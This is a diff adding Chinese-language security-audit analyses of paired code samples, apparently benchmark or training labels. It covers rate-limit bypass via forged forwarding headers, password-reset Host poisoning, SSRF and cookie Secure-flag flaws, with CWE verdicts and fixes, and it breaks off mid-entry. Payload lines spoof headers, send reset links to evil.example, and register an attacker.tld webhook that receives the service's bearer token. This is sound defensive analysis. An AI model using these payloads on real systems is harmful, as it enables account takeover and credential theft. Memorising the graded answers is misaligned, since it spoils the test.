+- [x] 调用方上下文缺失已标注"样本外假设"并列出需补片段
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-08 版本B
+入口: L9 方法参数 `userUrl`（调用方传入，调用通道样本外）
+链: 未发现可达污点流，原因: L10 要求 `userUrl` 以 `"https://avatars.example-cdn.net/"` 开头（前缀含域名后的 `/`）才允许 L13 `new URL(userUrl)` 出站，不满足即 L11 抛 `IllegalArgumentException`
+防御:
+  L10 `!userUrl.startsWith("https://avatars.example-cdn.net/")` → 有效: 前缀含尾部 `/` 封死两类常见绕过——`https://avatars.example-cdn.net.evil.com/`（第 32 字符为 `.` 不匹配前缀要求的 `/`）与 `https://avatars.example-cdn.net@evil.com/`（`@` 不匹配）；前缀匹配成功后 URL 主机位必然是 `avatars.example-cdn.net`（主机段在 `//` 与首个 `/` 之间已被固定）
+  L15 `conn.setSSLSocketFactory(SSLSocketFactory.getDefault())` → 有效: 使用系统默认信任链，证书校验开启
+  L16 `conn.setHostnameVerifier(HttpsURLConnection.getDefaultHostnameVerifier())` → 有效: 主机名与证书按默认规则比对
+（样本外假设: (a) 系统信任库本身健康；(b) L17 `getInputStream()` 默认跟随重定向，初始 URL 校验不覆盖重定向目标——若白名单域存在攻击者可注入 `Location` 的端点则可中转，需补该域行为证据）
+载荷: 不适用；`fetch("https://avatars.example-cdn.net.evil.com/x", null)` 与 `fetch("https://avatars.example-cdn.net@evil.com/x", null)` 均在 L10 被拒
+组合链: 无
+锚句: 非 CWE-918 因目的端主机被带尾斜杠的前缀白名单固定；非 CWE-295 因恢复系统默认信任链与主机名校验
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；建议将 L10 改为解析后精确比较（`new URL(userUrl)` 后比对 host），并显式控制重定向策略以覆盖样本外假设 (b)
+
+自查清单（441-08）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（方法参数）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖系统环境/重定向行为的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-09 版本A
+入口: L8 HTTP 头 `x-real-ip` | 次要: L9 HTTP 头 `x-forwarded-for`（首段）、L10 `req.socket.remoteAddress`（前两者为空时兜底）
+链: L8 攻击者控制的 `x-real-ip` 优先级最高 → L11-L12 `quota.get(ip)` / `quota.set(ip, n)` 以其作配额键 → L13 `if (n > 300)` 判定被架空
+防御:
+  L8-L10 头优先链 → 伪防御: `X-Real-IP: 1.2.3.4` 非空即完全决定键值，`X-Forwarded-For: 5.6.7.8` 亦然；无受信代理校验，真实对端地址仅在两头部均缺省时兜底
+载荷: `for i in $(seq 1 100000); do curl -s -H "X-Real-IP: q$i" http://host:8080/v1/query; done` —— 每请求一个新键，300 限额永不触发；假键同步写入 `quota` Map
+组合链: 伪造头绕过配额(CWE-799) → 攻击者任意字符串作 Map 键 L12 无淘汰插入 → 内存无界增长（CWE-770 放大，进程内可证）
+锚句: 非 CWE-441 因未发生内部请求转交，缺陷是键来源可伪造；非 CWE-770 单列因主缺陷是频率控制失效，Map 膨胀是其可达的放大后果
+结论: 存在漏洞=true | CWE-799 Improper Control of Interaction Frequency | Medium
+修复: L8-L10 改为 `const ip = req.socket.remoteAddress;`（该取值在 L10 已存在）；如需解析真实客户端，仅在 `remoteAddress` 属于已配置受信代理时从 XFF 右侧按固定跳数取段；为 `quota` 增加过期/容量上限
+
+自查清单（441-09）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（无有效防御层）
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-09 版本B
+入口: L8 TCP 对端 `req.socket.remoteAddress` | 次要: L9 HTTP 头 `x-forwarded-for`（L10-L12 条件采用）
+链: L9 将 XFF 拆分数组后，L10 `xff.length > TRUSTED_PROXY_COUNT(1)` 成立时 L11 取 `xff.slice(-TRUSTED_PROXY_COUNT - 1)[0]` 即倒数第二段——按标准追加语义，最后一段由前置代理写入、其左各段均为客户端自带 → 倒数第二段攻击者可任意指定 → L13-L14 以其作配额键 → L15 限额被架空
+防御:
+  L4 `TRUSTED_PROXY_COUNT = 1` 常量 → 伪防御: 跳数声明正确但 L11 取位错一跳，应取最右一段（`xff[xff.length - 1]`，由可信代理写入），`slice(-2)[0]` 实际取到客户端可控段，绕过串：`X-Forwarded-For: fake-a`（经追加后为 `fake-a, <真实IP>`，代码取到 `fake-a`）
+  直连场景（不带 XFF，`xff=[""]`，`length==1`）→ 有效: L12 回落 `remote`，键不可伪造
+（样本外假设: 绕过成立依赖前置代理采用标准"追加"行为（如 nginx `proxy_add_x_forwarded_for`）；若代理重写 XFF 则 `length==1` 走 `remote` 分支，退化为全站共享键——攻击者打满共享键可对全体用户造成 429，属可用性问题；需补代理配置与端口暴露面）
+载荷: `curl -H "X-Forwarded-For: fake-a" http://host/v1/query` 反复更换 `fake-*` → 每次独立计数，300 限额失效
+组合链: 取位错一跳绕过配额 → 同串作 Map 键无淘汰插入（CWE-770 放大）；或代理重写型部署下共享键被打满 → 全站 429
+锚句: 非 CWE-441 因未发生内部转交，缺陷是取位算法错位导致采信可注入段；非 CWE-770 单列因主缺陷仍是频率控制失效
+结论: 存在漏洞=true | CWE-799 Improper Control of Interaction Frequency | Medium
+修复: L11 改为取最右可信段 `xff[xff.length - 1]`（1 台可信代理写入的最右值），或以 L8 已有的 `remote` 直接作键；为 `quota` 增加上限/过期
+
+自查清单（441-09）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（指出取位错一跳的具体绕过串）
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖代理行为的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-10 版本A
+入口: L3 `headers` 中 `X-Forwarded-For`（`headers` 字典由调用方构造，通道样本外） | 次要: L6 `peer`
+链: L4 `if chain and chain[0]` 非空即采用 → L5 `return chain[0]` 返回 XFF 最左段（客户端可注入） → L9 作配额键 → L11-L12 `if used >= DAILY_LIMIT` 判定被架空
+防御:
+  L4 `chain[0]` 非空检查 → 伪防御: 首段恰是链上最外层、攻击者可直接注入的值，`X-Forwarded-For: fake` 即以 `fake` 计数，无受信代理前置门
+（样本外假设: `headers`/`peer` 的实际来源由调用方决定，需补调用点；样本内函数语义已完整可判）
+载荷: 反复携带每次不同的 `X-Forwarded-For: q1..qN` → 每键 L18 `get_usage(key)` 恒为 0，日限 1000 失效；假键同步经 L21 写入 `USAGE`
+组合链: 绕过配额(CWE-799) → 任意键无淘汰写入 `USAGE`（CWE-770 放大）
+锚句: 非 CWE-441 因无内部请求转交，缺陷是键可伪造；非 CWE-770 单列因主缺陷为频率控制失效
+结论: 存在漏洞=true | CWE-799 Improper Control of Interaction Frequency | Medium
+修复: L4-L5 改为仅在 `peer` 属于受信代理集合（可在 L1 前新增常量）时按固定可信跳数从 XFF 右侧取段，否则保留 L6 `return peer`；`USAGE` 增加过期/上限
+
+自查清单（441-10）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（无有效防御层）
+- [x] 判"安全"已枚举全部入口（headers、peer）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 调用方来源缺失已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-10 版本B
+入口: L4 `headers` 中 `X-Forwarded-For`（通道样本外） | 次要: L5 `peer`
+链: L5 `peer in KNOWN_PROXIES and len(chain) > len(KNOWN_PROXIES)` 成立时 L6 取 `chain[-len(KNOWN_PROXIES) - 1]` 即 `chain[-3]`——按 2 台可信代理的标准追加语义，最右两段由代理写入、真实客户端段位于 `chain[-2]`，倒数第三段是客户端自带值 → 攻击者自带 1 个伪造段即可使 L6 返回其伪造值 → L10 作配额键 → L12-L13 限额被架空
+防御:
+  L5 `peer in KNOWN_PROXIES` 前置门 → 有效部分: 非 `10.0.0.2`/`10.0.0.3` 直连时一律 L7 `return peer`，键不可伪造
+  L6 `chain[-len(KNOWN_PROXIES) - 1]` → 伪防御: 取位系统性偏左一跳，绕过串：`X-Forwarded-For: fake`（两跳追加后链为 `fake, <client>, <proxyA>`，`chain[-3]` 命中 `fake`）
+（样本外假设: (a) 两台代理均按标准"追加"语义写 XFF 且 `KNOWN_PROXIES` 与实际部署一致；(b) `headers`/`peer` 构造方式由调用方决定，需补调用点）
+载荷: 携带每次不同的 `X-Forwarded-For: fake-n` 经受信链请求 → `chain[-3]` 命中伪造段 → 日限 1000 失效
+组合链: 绕过配额 → 假键写入 `USAGE` 无界增长（CWE-770 放大）
+锚句: 非 CWE-441 因缺陷是取位算法错位；非 CWE-190 因无整数运算参与边界判定
+结论: 存在漏洞=true | CWE-799 Improper Control of Interaction Frequency | Medium
+修复: L6 改为 `chain[-len(KNOWN_PROXIES)]`（跳过 2 台代理写入的最右两段后取真实客户端段），并在 L5 同时校验链长与代理拓扑一致性；`USAGE` 增加上限/过期
+
+自查清单（441-10）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（指出取位错一跳的具体绕过串）
+- [x] 判"安全"已枚举全部入口（headers、peer）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖代理行为/调用方的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-11 版本A
+入口: L9 HTTP 表单参数 `email`（`r.FormValue`） | 次要: L12 HTTP 头 `Host`（`r.Host`）
+链: L12 `base := "https://" + r.Host + "/"` 以客户端可控的 Host 头构造站点根 → L13 `link := fmt.Sprintf("%sreset?token=%s", base, token)` 重置链接域名被注入 → L14 `sendMail(email, "reset link: "+link)` 将含攻击者域的链接发给 L9 指定的任一邮箱
+防御: （无任何校验）
+  L12 直接拼接 `r.Host` → 伪防御: 请求 `Host: evil.example` 即令链接指向攻击者域；无 allowlist、无与配置域名的比对
+（样本外假设: `newToken` 与 `sendMail` 的实现在样本外（token 强度与投递路径），样本内已可证 L12-L14 的注入与发送链）
+载荷: `curl -X POST -H "Host: evil.example" -d "email=victim@corp.com" http://app/reset` → 受害者收到 `https://evil.example/reset?token=<token>` → 点击后 token 送攻击者
+组合链: Host 投毒(L12) → 受害者点击投毒链接 → token 泄露给攻击者 → 攻击者凭 token 完成密码重置 → 账户接管（重置流程实现样本外）
+锚句: 非 CWE-79 因注入位置是邮件内链接而非浏览器渲染上下文；非 CWE-347 因不涉及令牌签名验证本身
+结论: 存在漏洞=true | CWE-640 Weak Password Recovery Mechanism for Forgotten Password | High
+修复: L12 改用固定常量域名（样本内新增 `const baseURL = "https://accounts.example.com/"` 即可），删除对 `r.Host` 的拼接；如必须支持多域名，对 `r.Host` 做配置域名白名单严格比对
+
+自查清单（441-11）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（无有效防御层）
+- [x] 判"安全"已枚举全部入口（表单参数、Host 头）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖样本外函数实现的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-11 版本B
+入口: L11 HTTP 表单参数 `email`
+链: 未发现可达污点流，原因: L13 `base := BaseURL` 取自 L8 `var BaseURL = "https://accounts.example.com/"` 硬编码值，L14 链接域名恒定；`r.Host` 在本版本无读取点
+防御:
+  L8 包级常量域名 → 有效: 样本内无任何对 `BaseURL` 的赋值点，链接域名不可被请求影响
+（样本外假设: (a) `BaseURL` 声明为可导出 `var` 而非 `const`，若样本外其他包运行时改写则可控（样本内无证据，仅理论面）；(b) `newToken` 强度样本外）
+载荷: 不适用；任意 `Host:` 头不影响 L14 链接
+组合链: 无
+锚句: 非 CWE-640 因重置链接域名不可注入；非 CWE-347 因 token 生成与验证不属本样本可判范围
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；建议将 L8 `var` 改为 `const` 消除运行时改写面
+
+自查清单（441-11）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（表单参数、Host 头）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖样本外改写可能性的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-12 版本A
+入口: L4 HTTP 头 `HTTP_HOST`（`$_SERVER['HTTP_HOST'] ?? 'localhost'`）
+链: L4 攻击者完全控制 Host 头 → L5 `'https://' . $host . $path` 拼进链接域名位 → L8-L10 `password_reset_mail()` 生成含注入域的重置链接（L12 演示调用）
+防御:
+  L4 `?? 'localhost'` 默认值 → 伪防御: 仅在头缺失时生效，`Host: evil.example` 存在即被采用；无域名白名单
+  L9 `urlencode($token)` → 有效: token 值位被 URL 编码，无法借 token 改变链接结构——但域名位（L4-L5）不受此保护
+（样本外假设: `password_reset_mail()` 的真实调用方（邮件投递链）在样本外，需补调用点；样本内 L12 为演示调用）
+载荷: 构造执行 `password_reset_mail()` 的请求并携带 `Host: evil.example` → 生成 `https://evil.example/reset?token=...`
+组合链: Host 投毒 → 受害者点击投毒重置链接 → token 泄露 → 账户接管（理论链：邮件投递与用户点击在样本外）
+锚句: 非 CWE-79 因输出进入邮件文本而非 HTML 上下文；非 CWE-601 因不涉及服务端/浏览器跳转指令
+结论: 存在漏洞=true | CWE-640 Weak Password Recovery Mechanism for Forgotten Password | High
+修复: L5 改为使用固定常量（样本内新增 `define('APP_BASE_URL', 'https://app.example.com');` 后 `return APP_BASE_URL . $path;`），删除 L4 对 `HTTP_HOST` 在链接内的使用
+
+自查清单（441-12）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（默认值伪防御已排除）
+- [x] 判"安全"已枚举全部入口（Host 头、token 参数）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 调用链尾部缺失已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-12 版本B
+入口: 无外部可控入口进入链接构造（L8-L11 仅消费常量与 `urlencode` 后的 token）
+链: 未发现可达污点流，原因: L5 `return APP_BASE_URL . $path;` 的域名位来自 L2 `define('APP_BASE_URL', 'https://app.example.com');` 编译期常量，样本内无 `HTTP_HOST` 读取点
+防御:
+  L2 `define()` 常量 → 有效: PHP 常量不可在运行时改写，链接域名固定
+  L9 `urlencode($token)` → 有效: token 值位编码，不能借 `/`、`?`、`#` 等改变链接结构
+（注：L5 行内注释声称"HTTP_HOST 仅记日志"，本文件并无任何日志代码——注释与代码不符，按代码真实行为判定）
+载荷: 不适用；任意 `Host:` 头不影响输出链接
+组合链: 无
+锚句: 非 CWE-640 因链接域名不可注入；非 CWE-20 因 `$path` 由 L9 传入字面量 `/reset?token=...`，非外部输入
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项
+
+自查清单（441-12）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（Host 头、token 参数、常量）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 本包无需样本外前提的判断（注释失实已在正文指出）
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-13 版本A
+入口: L9 HTTP JSON body `callback_url` | 次要: L10 `scope`（自报值直接入库）
+链: L9 `callback` 完全由攻击者指定 → L12 `requests.get(callback, timeout=3, ...)` 以本服务（内网身份）出站 → L13 请求头携带 `"Authorization": "Bearer " + INTERNAL_TOKEN` 服务凭证送达攻击者服务器 → L16 `save_webhook(callback, scope)` 持久化任意回调
+防御:
+  L14 `if probe.status_code >= 500` → 伪防御: 仅过滤探针返回 5xx 的目标，`http://attacker.tld/`（返回 200）与 `http://127.0.0.1:PORT/` 照常通过；无 scheme/host/IP 任何校验
+（样本外假设: `INTERNAL_TOKEN` 与 `save_webhook` 在样本内无定义（缺失则 NameError），其存在性与 token 权限需补定义；SSRF 本身仅凭 L12 即成立）
+载荷: `POST /register-webhook {"callback_url":"http://attacker.tld/"}` → L12-L13 出站请求带 `Bearer <INTERNAL_TOKEN>`，攻击者在自有服务器读取该头获得服务凭证
+组合链: SSRF(CWE-918) → L13 `Authorization` 头外泄 Bearer 凭证(CWE-200 放大) → 攻击者以服务身份调用接受该 token 的内部接口（接受端样本外）
+锚句: 非 CWE-798 因 `INTERNAL_TOKEN` 非硬编码字面量而是运行时引用；非 CWE-441 单列因主缺陷是目的端未校验的出站请求（918 更具体）
+结论: 存在漏洞=true | CWE-918 Server-Side Request Forgery (SSRF) | High
+修复: L12 之前增加 scheme/host 白名单与解析 IP 排除内网段校验（标准库 `ipaddress`、`socket`、`urllib.parse`）；L13 删除 `Authorization` 头或改为仅对通过校验的固定域发送；L10 `scope` 建议做服务端枚举校验
+
+自查清单（441-13）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（唯一防线为伪防御）
+- [x] 判"安全"已枚举全部入口（JSON body 字段）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖样本外定义的判断已标注"样本外假设"并列出需补片段
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-13 版本B
+入口: L20 HTTP JSON body `callback_url` | 次要: L21 `scope`
+链: 未发现可达污点流，原因: L22-L23 要求 `urlparse(callback).hostname` 命中 L8 `EGRESS_ALLOWLIST`，L25-L27 再解析全部地址排除内网段后，才在 L29 出站；不满足即返回 400
+防御:
+  L23 `if host not in EGRESS_ALLOWLIST` → 有效: `urlparse().hostname` 取 `@` 后主机位并小写，`https://hooks.partner.example.com@evil.com/` 解析出 `evil.com` 被拒；`file:///etc/passwd` 的 hostname 为 `None` 被拒
+  L25-L27 `socket.getaddrinfo` 全地址段检查 → 有效: 对该域解析出的每个地址执行 L13-L15 `is_ip_forbidden`（覆盖 `127/8`、`10/8`、`172.16/12`、`192.168/16`、`169.254/16`、`::1`、`fc00::/7`、`fe80::/10`），直指内网被拒
+  L29 `probe_headers = {"User-Agent": "webhook-probe/1.0"}` → 有效: 出站请求不携带服务凭证头
+（样本外假设: (a) L29 `requests.get` 默认跟随重定向，若白名单域存在攻击者可控 `Location` 端点可中转至内网，样本内不可构造；(b) L25 检查与 L29 连接两次 DNS 解析间无劫持（rebinding 前提）；(c) L13-L15 未归一 IPv4-mapped IPv6（如 `::ffff:10.0.0.5` 不匹配任何禁网段），利用需对该域解析的控制权，样本外）
+载荷: 不适用；`callback_url=https://evil.com/` 与 `=https://hooks.partner.example.com@evil.com/` 均在 L23 被拒
+组合链: 无（残留面见防御栏样本外假设 a/c）
+锚句: 非 CWE-918 因目的端被域名白名单+解析网段双重校验；非 CWE-200 因出站请求不携带服务凭证
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；建议 (1) 禁用/校验重定向目标，(2) L13-L15 对 `a.ipv4_mapped` 先归一再比对（标准库 `ipaddress` 已导入）
+
+自查清单（441-13）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（JSON body 字段、DNS、重定向）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖 DNS 稳定性/重定向行为的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-14 版本A
+入口: L9 HTTP JSON body `callbackUrl` | 次要: L9 `secret`（原样入库）
+链: L9 `callbackUrl` 完全由攻击者指定 → L11 `fetch(callbackUrl, {...})` 以本服务身份出站 → L12 请求头携带 `"X-Introspect-Auth": INTERNAL_SVC_TOKEN` 服务令牌送达攻击者服务器 → L15 `db.saveWebhook({callbackUrl, secret})` 持久化
+防御: （无任何校验）
+  L14 `if (!resp.ok)` → 伪防御: 仅看状态码，`http://127.0.0.1:PORT/`、`http://169.254.169.254/` 照常探测并回读；无 scheme/host/IP 校验
+（样本外假设: (a) `db` 对象样本内未定义，需补定义；(b) `SVC_TOKEN` 来自环境变量，未设置时 L12 头值为 `undefined`，行为取决于 node-fetch 版本；(c) 令牌的实际权限决定组合链上限）
+载荷: `POST /integrations/webhook {"callbackUrl":"http://attacker.tld/"}` → L11-L12 出站请求头带 `X-Introspect-Auth: <SVC_TOKEN>`，攻击者读取该头获得服务令牌
+组合链: SSRF(CWE-918) → L12 令牌外泄(CWE-200 放大) → 以服务身份调用内部接口（接受端样本外）
+锚句: 非 CWE-798 因令牌取自环境变量而非硬编码字面量；非 CWE-639 因无对象级授权场景
+结论: 存在漏洞=true | CWE-918 Server-Side Request Forgery (SSRF) | High
+修复: L11 之前增加 URL 校验：`new URL` 解析后要求 `https:` 且 hostname 白名单（样本内新增常量），DNS 解析结果排除内网段（`dns` 模块需新增导入）；L12 删除令牌头或仅对校验过的固定域发送
+
+自查清单（441-14）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（唯一防线为伪防御）
+- [x] 判"安全"已枚举全部入口（JSON body 字段）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖样本外定义的判断已标注"样本外假设"并列出需补片段
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-14 版本B
+入口: L16 HTTP JSON body `callbackUrl`
+链: 未发现可达污点流，原因: L18 `new URL(callbackUrl)` 解析失败即 400；L19 要求 `u.protocol === "https:"` 且 `u.hostname` 命中 L8 `INTEGRATION_HOSTS`；L22-L24 解析 A/AAAA 记录排除禁网段后才在 L27 出站
+防御:
+  L19 协议+主机白名单 → 有效: `new URL().hostname` 取 `@` 后主机位，`https://hooks.partner.example.com@evil.com/` 被拒；非 https 被拒
+  L22-L24 DNS 解析段检查 → 有效: `resolve6`/`resolve4` 结果经 L11-L13 `isForbiddenIp`（L9 正则覆盖 `127/8`、`10/8`、`192.168/16`、`172.16-31`、`169.254/16`、`::1`、`fc00::/7`、`fe80::/10` 前缀），直指内网被拒；解析失败 `.catch(() => [])` 不放行非白名单目标（目标已被 L19 锁定）
+  L27 `headers: { "User-Agent": "webhook-probe/1.0" }` → 有效: 出站请求不携带令牌头
+（样本外假设: (a) L27 `fetch` 默认跟随重定向，白名单域上攻击者可控 `Location` 端点可中转，样本内不可构造；(b) L22-L23 检查与 L27 连接两次 DNS 解析间无劫持（rebinding 前提）；(c) L9 正则未覆盖 `::ffff:10.0.0.1` 类 IPv4-mapped 写法及 `100.64/10`、`0.0.0.0/8` 等段，利用需对该域解析控制权，样本外）
+载荷: 不适用；`callbackUrl=https://evil.com/`、`=http://hooks.partner.example.com/` 均在 L19 被拒
+组合链: 无（残留面见样本外假设 a/c）
+锚句: 非 CWE-918 因目的端被协议+主机白名单与解析网段双重校验；非 CWE-200 因出站不携带令牌
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；建议禁用/校验重定向，并将 L9 正则扩展覆盖 IPv4-mapped IPv6（可统一先按地址族归一再比对）
+（注：L29 `db.saveWebhook(req.body)` 将整个请求体入库，含调用方提交的 `secret` 字段——信息处置面，非可达漏洞）
+
+自查清单（441-14）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（JSON body、DNS、重定向）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖 DNS 稳定性/重定向行为的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-15 版本A
+入口: L8 HTTP 头 `X-Forwarded-Proto` | 次要: L10 `req.getScheme()`（头缺失时兜底）
+链: L8 攻击者控制的 `X-Forwarded-Proto` 优先采用 → L12 `"https".equalsIgnoreCase(proto)` 使 secure 判定随请求方指定 → L16-L17 决定会话 cookie 是否携带 `; Secure`
+防御: （无任何校验）
+  L8 直接采信转发头 → 伪防御: 明文请求携带 `X-Forwarded-Proto: https` 即令 `isSecure()` 返回 true；携带 `X-Forwarded-Proto: http`（或不带）即令其为 false，secure 位完全由请求方指定
+（样本外假设: (a) 部署中代理是否覆写/剥离 XFP 决定可利用性；(b) 样本外是否存在其他 `isSecure()` 消费点决定组合链上限；样本内可证的是 secure 位随请求头切换）
+载荷: `curl -H "X-Forwarded-Proto: https" http://host/login`（明文）→ L17 产出 `SID=...; HttpOnly; Secure` 与实际明文传输不符；反之，若 TLS 终结代理未覆写 XFP 而值为 `http`，L17 产出无 `Secure` 的会话 cookie（CWE-614 面）
+组合链: 攻击者指定 secure 位 → 若样本外存在基于 `isSecure()` 的其他安全判定（如注释声称的"是否跳过 TLS 检查"），可借 `X-Forwarded-Proto: https` 使其误判为安全上下文（理论链）
+锚句: 非 CWE-319 因缺陷核心是安全属性随不可信输入切换而非算法/协议选择本身；非 CWE-614 单列因 cookie 缺 `Secure` 是该决策错位的下游表现
+结论: 存在漏洞=true | CWE-807 Reliance on Untrusted Inputs in a Security Decision | Medium
+修复: L8-L11 删除对 `X-Forwarded-Proto` 的采信，改为 `return req.isSecure();`（`HttpServletRequest.isSecure()` 为当前已导入接口的标准方法，由容器按实际连接填充）；如需反代场景，应在代理层固定覆写该头且仅信任受信代理来源
+
+自查清单（441-15）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（无有效防御层）
+- [x] 判"安全"已枚举全部入口（HTTP 头、容器属性）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署与其他消费点的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-15 版本B
+入口: L8 `req.isSecure()`（servlet 容器按实际连接协议填充）
+链: 未发现可达污点流，原因: L8 判定仅消费容器属性 `req.isSecure()`，样本内无任何请求头读取点（`X-Forwarded-Proto` 无引用）
+防御:
+  L8 `return req.isSecure();` → 有效: 返回值由 servlet 容器依据传输层连接状态决定，攻击者无法通过请求头/参数影响
